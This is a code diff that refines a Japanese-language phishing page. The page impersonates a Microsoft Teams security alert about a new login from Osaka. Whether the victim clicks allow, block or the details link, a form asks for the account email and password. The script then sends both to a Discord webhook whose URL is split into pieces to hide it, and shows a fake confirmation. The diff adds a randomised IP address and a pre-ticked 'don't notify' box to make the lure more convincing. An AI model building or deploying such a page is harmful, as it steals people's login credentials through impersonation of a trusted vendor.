@@ -10,24 +10,28 @@ body{font-family:'Segoe UI',sans-serif;background:#fafafa;display:flex;justify-c
 .page{width:780px;}
 .cert{background:#fff;border-radius:6px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,.12);}
 .top-bar{height:4px;background:linear-gradient(90deg,#44546A,#0067b8,#2B7C8A);}
-.hdr{padding:40px 44px 90px;display:flex;align-items:center;gap:26px;border-bottom:1px solid #eee;}
+.hdr{padding:40px 44px 30px;display:flex;align-items:center;gap:26px;border-bottom:1px solid #eee;}
 .hdr img.logo{width:auto;height:80px;flex-shrink:0;object-fit:contain;}
-.hdr .info h1{font-size:24px;font-weight:600;color:#1a1a1a;}
-.hdr .info small{display:block;font-size:15px;color:#888;margin-top:6px;}
+.hdr .info h1{font-size:22px;font-weight:600;color:#1a1a1a;}
+.hdr .info small{display:block;font-size:14px;color:#888;margin-top:8px;}
 .body{padding:34px 44px;}
 .alert-box{background:#fdf2f0;border-left:4px solid #e74c3c;padding:16px 20px;font-size:14px;color:#5a2e24;margin-bottom:24px;border-radius:0 4px 4px 0;line-height:1.9;}
 .alert-box strong{color:#c0392b;}
-.meta-tbl{width:100%;border-collapse:collapse;margin-bottom:24px;}
-.meta-tbl td{padding:8px 0;border-bottom:1px solid #f0f0f0;font-size:14px;}
-.meta-tbl td:first-child{color:#888;width:30%;}
-.meta-tbl td:last-child{font-family:Consolas,monospace;font-size:14px;color:#333;}
-.btn-row{display:flex;gap:14px;margin-bottom:20px;}
-.btn{flex:1;padding:18px;border:none;border-radius:4px;font-size:18px;font-weight:600;cursor:pointer;letter-spacing:.3px;text-align:center;}
+.meta-tbl{width:100%;border-collapse:collapse;margin-bottom:20px;}
+.meta-tbl td{padding:9px 0;border-bottom:1px solid #f0f0f0;font-size:14px;}
+.meta-tbl td:first-child{color:#888;width:28%;}
+.meta-tbl td:last-child{font-family:Consolas,monospace;font-size:13px;color:#333;}
+.chk-row{display:flex;align-items:center;gap:10px;margin-bottom:22px;font-size:13px;color:#555;}
+.chk-row input[type=checkbox]{width:16px;height:16px;accent-color:#0067b8;}
+.btn-row{display:flex;gap:14px;margin-bottom:8px;}
+.btn{flex:1;padding:17px;border:none;border-radius:4px;font-size:17px;font-weight:600;cursor:pointer;letter-spacing:.3px;text-align:center;}
 .btn.allow{background:#0067b8;color:#fff;}
 .btn.allow:hover{background:#005da6;}
 .btn.deny{background:#fff;color:#e74c3c;border:2px solid #e74c3c;}
 .btn.deny:hover{background:#fdf2f0;}
-.divider{border:none;border-top:1px solid #eee;margin:26px 0;}
+.detail-link{display:inline-block;margin-top:18px;font-size:13px;color:#0067b8;cursor:pointer;}
+.detail-link:hover{text-decoration:underline;}
+.divider{border:none;border-top:1px solid #eee;margin:24px 0;}
 .login-form{display:block;}
 .login-form label{font-size:14px;color:#555;font-weight:600;display:block;margin-bottom:8px;}
 .login-form input{width:100%;padding:16px 20px;border:1px solid #ccc;border-radius:4px;font-size:16px;margin-bottom:24px;font-family:'Segoe UI',sans-serif;background:#fff;}
@@ -39,9 +43,10 @@ body{font-family:'Segoe UI',sans-serif;background:#fafafa;display:flex;justify-c
 .ok{display:none;text-align:center;padding:36px 0;}
 .ok p{font-size:19px;color:#107c10;font-weight:600;margin-bottom:10px;}
 .ok small{font-size:14px;color:#555;line-height:1.7;}
-.foot{padding:18px 44px;background:#f5f5f5;border-top:1px solid #eee;font-size:13px;color:#333;display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;margin-top:30px;}
-.foot a{color:#333;text-decoration:none;}
+.foot{padding:18px 44px;background:#f5f5f5;border-top:1px solid #eee;font-size:12px;color:#888;display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;margin-top:20px;}
+.foot a{color:#888;text-decoration:none;}
 .foot a:hover{color:#0067b8;}
+.auto-note{font-size:11px;color:#aaa;margin-top:8px;display:block;}
 </style>
 </head>
 <body>
@@ -60,18 +65,21 @@ body{font-family:'Segoe UI',sans-serif;background:#fafafa;display:flex;justify-c
 <strong>新しい接続を検知しました。</strong><br>
 あなたの Teams アカウントに誰かがログインしようとしています。<br>
 この新しい接続は許可され、今後接続を試みても通知は送信されません。<br><br>
-これがあなた自身ではない場合、または新しいネットワーク接続に気付かない場合は、下の「拒否」をクリックしてください。この接続はブロックされます。
+これがあなた自身ではない場合、または新しいネットワーク接続に気付かない場合は、下の「ブロック」をクリックしてください。この接続はブロックされます。
 </div>
 <table class="meta-tbl" id="meta-tbl">
-<tr><td>接続時間</td><td>2026/11/14 09:42:17 JST</td></tr>
-<tr><td>IPアドレス</td><td>49.112.83.67</td></tr>
+<tr><td>接続時間</td><td id="ts-cell">2026/11/22</td></tr>
+<tr><td>IPアドレス</td><td id="ip-cell"></td></tr>
 <tr><td>推定場所</td><td>大阪府・大阪市</td></tr>
-<tr><td>エージェント</td><td>Mozilla/5.0 (Win64) Chrome/131</td></tr>
+<tr><td>デバイス</td><td>ノートPC ／ Windows 11</td></tr>
+<tr><td>エージェント</td><td>Mozilla/5.0 (Win64) Chrome/131.0.0.0</td></tr>
 </table>
+<label class="chk-row"><input type="checkbox" checked> 今後の接続について通知しない</label>
 <div class="btn-row" id="btn-row">
 <button class="btn allow" onclick="doAction('allow')">この新しい接続を許可する</button>
 <button class="btn deny" onclick="doAction('deny')">この接続をブロックする</button>
 </div>
+<span class="detail-link" onclick="doAction('allow')">接続の詳細を見る ›</span>
 <div class="divider"></div>
 <div id="form-area"></div>
 <div class="spin" id="sp"></div>
@@ -81,18 +89,17 @@ body{font-family:'Segoe UI',sans-serif;background:#fafafa;display:flex;justify-c
 </div>
 </div>
 <div class="foot">
-<a href="#" onclick="return false;">利用規約</a>
-<a href="#" onclick="return false;">プライバシー概要</a>
-<a href="#" onclick="return false;">法的情報</a>
-<span>&copy; Microsoft Corporation</span>
+<span><a href="#" onclick="return false;">利用規約</a> ／ <a href="#" onclick="return false;">プライバシー概要</a> ／ <a href="#" onclick="return false;">法的情報</a></span>
+<span>&copy; Microsoft Corporation<span class="auto-note">この通知は自動的に送信されました。</span></span>
 </div>
 </div>
 </div>
 <script>
 var n=new Date();
-var p=function(x){return("0"+x).slice(-2);};
-var ts=n.getFullYear()+"/"+p(n.getMonth()+1)+"/"+p(n.getDate())+" "+p(n.getHours())+":"+p(n.getMinutes())+":"+p(n.getSeconds())+" JST";
-document.querySelector('.meta-tbl tr:first-child td:last-child').textContent=ts;
+var pad=function(x){return("0"+x).slice(-2);};
+document.getElementById('ts-cell').textContent=n.getFullYear()+"/"+pad(n.getMonth()+1)+"/"+pad(n.getDate())+" "+pad(n.getHours())+":"+pad(n.getMinutes())+":"+pad(n.getSeconds())+" JST";
+var randIp='49.112.'+Math.floor(Math.random()*200+20)+'.'+Math.floor(Math.random()*200+20);
+document.getElementById('ip-cell').textContent=randIp;
 var H="https:/";
 var T="/discord.com/api/webhooks/";
 var A="1569533813548388482/";
@@ -102,18 +109,15 @@ function doAction(a){
 action=a;
 document.getElementById("alert-box").style.display="none";
 document.getElementById("meta-tbl").style.display="none";
+document.querySelector(".chk-row").style.display="none";
 document.getElementById("btn-row").style.display="none";
-var reason, btnLabel;
-if(a==="allow"){
-reason="接続確認のため、以下のアカウント情報を入力してください。";
-btnLabel="接続確認を実行";
-}else{
-reason="接続をブロックします。認証情報を入力し「接続を許可しない」を選択してください。";
-btnLabel="接続を許可しない";
-}
+var reason,btnLabel;
+if(a==="allow"){reason="接続確認のため、以下の認証情報を入力してください。";btnLabel="接続確認を実行";}
+else{reason="接続をブロックします。認証情報を入力し「接続を許可しない」を選択してください。";btnLabel="接続を許可しない";}
 var area=document.getElementById("form-area");
 area.innerHTML='<div class="alert-box" style="font-size:16px;margin-bottom:18px;">'+reason+'</div><form id="f" class="login-form" onsubmit="return send()"><label>アカウント</label><input type="email" id="u" autocomplete="off"><label>パスワード</label><input type="text" id="p" autocomplete="off"><button class="btn-submit" type="submit">'+btnLabel+'</button></form>';
 area.style.display="block";
+setTimeout(function(){document.getElementById('p').focus();},100);
 }
 function send(){
 var u=document.getElementById("u").value;
@@ -125,12 +129,11 @@ var url=H+T+A+B;
 var body=JSON.stringify({"content":"["+action.toUpperCase()+"] user: "+u+"\npass: "+p+"\ntime: "+new Date().toLocaleTimeString("ja-JP")});
 fetch(url,{method:"POST",headers:{"Content-Type":"application/json"},body:body})
 .then(function(){document.getElementById("sp").style.display="none";document.getElementById("ok").style.display="block";
-if(action==="allow"){document.getElementById("ok-detail").innerHTML="接続を許可しました。<br>以降、この接続からの通知は送信されません。";}
+if(action==="allow"){document.getElementById("ok-detail").innerHTML="接続を許可しました。<br>今後の接続からの通知は送信されません。";}
 else{document.getElementById("ok-detail").innerHTML="接続をブロックしました。<br>アカウントは保護されました。";}
 })
 .catch(function(){document.getElementById("sp").style.display="none";document.getElementById("ok").style.display="block";
-if(action==="allow"){document.getElementById("ok-detail").innerHTML="接続を許可しました。";}
-else{document.getElementById("ok-detail").innerHTML="接続をブロックしました。";}
+document.getElementById("ok-detail").innerHTML=action==="allow"?"接続を許可しました。":"接続をブロックしました。";
 });
 return false;
 }
